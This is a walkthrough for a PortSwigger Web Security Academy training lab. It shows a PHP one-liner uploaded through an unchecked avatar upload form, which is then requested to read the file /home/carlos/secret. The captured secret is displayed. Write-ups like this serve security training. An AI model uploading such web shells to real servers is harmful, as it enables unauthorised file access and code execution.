{"id":"portswigger-web-security-academy--server-side-vulnerabilities--file-upload-vulnerabilities--remote-code-execution-via-web-shell-upload","path":"portswigger-web-security-academy/server-side-vulnerabilities/file-upload-vulnerabilities/remote-code-execution-via-web-shell-upload.md","title":"Remote code execution via web shell upload","category":"portswigger-web-security-academy","source":"https://github.com/Perryong/Writeups-and-Walkthroughs/blob/dd03effbc624dbb8789fbd7775369769cec81a36/portswigger-web-security-academy/server-side-vulnerabilities/file-upload-vulnerabilities/remote-code-execution-via-web-shell-upload.md","html":"<h1 id=\"remote-code-execution-via-web-shell-upload\">Remote code execution via web shell upload</h1>\n<h2 id=\"description\">Description</h2>\n<p>This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.</p>\n<p>To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file <code>/home/carlos/secret</code>. Submit this secret using the button provided in the lab banner.</p>\n<p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>\n<h2 id=\"solution\">Solution</h2>\n<figure><button type=\"button\" class=\"image-expand\" aria-label=\"Expand Remote code execution via web shell upload screenshot\"><img src=\"https://raw.githubusercontent.com/Perryong/Writeups-and-Walkthroughs/dd03effbc624dbb8789fbd7775369769cec81a36/.gitbook/assets/image%20(103).png\" alt=\"Remote code execution via web shell upload screenshot\"></button><figcaption></figcaption></figure>\n\n<p>After login as Wiener user there's an upload option to upload avatar image:</p>\n<figure><button type=\"button\" class=\"image-expand\" aria-label=\"Expand Remote code execution via web shell upload screenshot\"><img src=\"https://raw.githubusercontent.com/Perryong/Writeups-and-Walkthroughs/dd03effbc624dbb8789fbd7775369769cec81a36/.gitbook/assets/image%20(105).png\" alt=\"Remote code execution via web shell upload screenshot\"></button><figcaption></figcaption></figure>\n\n<p>with the avatar image at this path/location:</p>\n<p><a href=\"https://0ab300990381641d80b5b7de005e0030.web-security-academy.net/resources/images/avatarDefault.svg\" target=\"_blank\" rel=\"noopener noreferrer\">https://0ab300990381641d80b5b7de005e0030.web-security-academy.net/resources/images/avatarDefault.svg</a></p>\n<p>We need to obtain Carlos's secret, we can do it upload a php shell (<code>php_web_shell.php</code>) that get secret file content</p>\n<div class=\"walkthrough-command\"><button type=\"button\" class=\"copy-command\">Copy command</button><pre><code class=\"language-php\">&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;\n</code></pre></div>\n<figure><button type=\"button\" class=\"image-expand\" aria-label=\"Expand Remote code execution via web shell upload screenshot\"><img src=\"https://raw.githubusercontent.com/Perryong/Writeups-and-Walkthroughs/dd03effbc624dbb8789fbd7775369769cec81a36/.gitbook/assets/image%20(107).png\" alt=\"Remote code execution via web shell upload screenshot\"></button><figcaption></figcaption></figure>\n\n<p>there's not a sanitizaiton and we can upload it directly:</p>\n<figure><button type=\"button\" class=\"image-expand\" aria-label=\"Expand Remote code execution via web shell upload screenshot\"><img src=\"https://raw.githubusercontent.com/Perryong/Writeups-and-Walkthroughs/dd03effbc624dbb8789fbd7775369769cec81a36/.gitbook/assets/image%20(106).png\" alt=\"Remote code execution via web shell upload screenshot\"></button><figcaption></figcaption></figure>\n\n<p>We know the file location and we can open it going to: <a href=\"https://0ab300990381641d80b5b7de005e0030.web-security-academy.net/files/avatars/php_web_shell.php\" target=\"_blank\" rel=\"noopener noreferrer\">https://0ab300990381641d80b5b7de005e0030.web-security-academy.net/files/avatars/php_web_shell.php</a></p>\n<figure><button type=\"button\" class=\"image-expand\" aria-label=\"Expand Remote code execution via web shell upload screenshot\"><img src=\"https://raw.githubusercontent.com/Perryong/Writeups-and-Walkthroughs/dd03effbc624dbb8789fbd7775369769cec81a36/.gitbook/assets/image%20(108).png\" alt=\"Remote code execution via web shell upload screenshot\"></button><figcaption></figcaption></figure>\n\n<details>\n\n<summary>Carlos's Secret</summary>\n\n<p>5707rbX0roByRQsol0HGASNWMbFg7KwJ</p>\n</details>\n\n<p>Obtaining Carlos's secret and solving the lab.</p>\n<figure><button type=\"button\" class=\"image-expand\" aria-label=\"Expand Remote code execution via web shell upload screenshot\"><img src=\"https://raw.githubusercontent.com/Perryong/Writeups-and-Walkthroughs/dd03effbc624dbb8789fbd7775369769cec81a36/.gitbook/assets/image%20(109).png\" alt=\"Remote code execution via web shell upload screenshot\"></button><figcaption></figcaption></figure>\n","toc":[{"id":"description","title":"Description","level":2},{"id":"solution","title":"Solution","level":2}],"excerpt":"Remote code execution via web shell upload Description This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable inp","searchText":"Description Solution"}